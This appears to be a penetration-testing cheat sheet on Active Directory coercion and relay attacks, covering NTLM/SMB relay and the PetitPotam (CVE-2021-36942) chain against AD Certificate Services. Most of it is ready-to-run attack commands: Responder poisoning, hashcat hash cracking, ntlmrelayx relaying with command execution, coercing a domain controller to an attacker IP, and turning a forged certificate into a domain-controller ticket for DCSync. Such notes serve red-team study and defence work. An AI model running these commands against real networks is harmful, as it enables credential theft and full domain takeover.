# Coercion/Relay Attacks

<details>

<summary>Kerberos Relay</summary>



</details>

### NTLM Relay/SMB Relay <a href="#petitpotam-ms-efsrpc" id="petitpotam-ms-efsrpc"></a>

* **Server Message Block**
  * `sudo responder -I <network-iface> -dP`  // -dPw DHCP, ProxyAuth, Wpad
  * `hashcat -m 5600 <hash-file> <passwords> --force`&#x20;
* **Prerequisites to relay NTLM hash**
  * SMB Signing should either be disabled or enabled but not enforced
  * Account needs relevant permissions on server to access requested resources. (Admin privilege)
* `sudo nano /etc/responder/Responder.conf` -> Turn off SMB and HTTP (not required - for learning purpose)
* `ntlmrelayx.py -tf targets.txt -smb2support` (-c “whoami”, -i )
* `impacket-ntlmrelayx -tf targets.txt -smb2support` (-c “whoami”, -i )

### [PetitPotam](https://github.com/topotam/PetitPotam) (MS-EFSRPC) <a href="#petitpotam-ms-efsrpc" id="petitpotam-ms-efsrpc"></a>

* [CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942) is an LSA spoofing vulnerability
* Allows an unauthenticated attacker to coerce a Domain Controller to authenticate against another host using NTLM over port 445 via the Local Security Authority Remote Protocol by abusing Microsoft’s Encrypting File System Remote Protocol. This technique allows an unauthenticated attacker to take over a Windows domain where ADCS is in use.
* In the attack, an authentication request from the targeted Domain Controller is relayed to the CA host's Web Enrollment page and makes a Certificate Signing Request (CSR) for a new digital certificate. This certificate can then be used with a tool such as Rubeus or gettgtpkinit.py to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
* Identify the CA server using [certi](https://github.com/zer1t0/certi)
* `sudo ntlmrelayx.py -debug -smb2support --target http://<CA.Domain.LOCAL>/certsrv/certfnsh.asp --adcs --template DomainController`
* `python3 petitpotom.py <attack-IP> <DC-IP>`  <sup><sub>(or use mimikatz)<sub></sup>
* `mimikatz # misc::efs /server:<DC-IP> /connect:<Attacker-IP>`  <sup><sub>(or petitpotam.py)<sub></sup>
* `python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<DC-machine-acc> -pfx-base64 <base64-certificate> dc01.ccache`
* `export KRB5CCNAME=dc01.ccache`
* **Tools**
  * [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1), [PetitPotam](https://github.com/topotam/PetitPotam), [PKINITtools](https://github.com/dirkjanm/PKINITtools)
* **Reference**
  * [https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
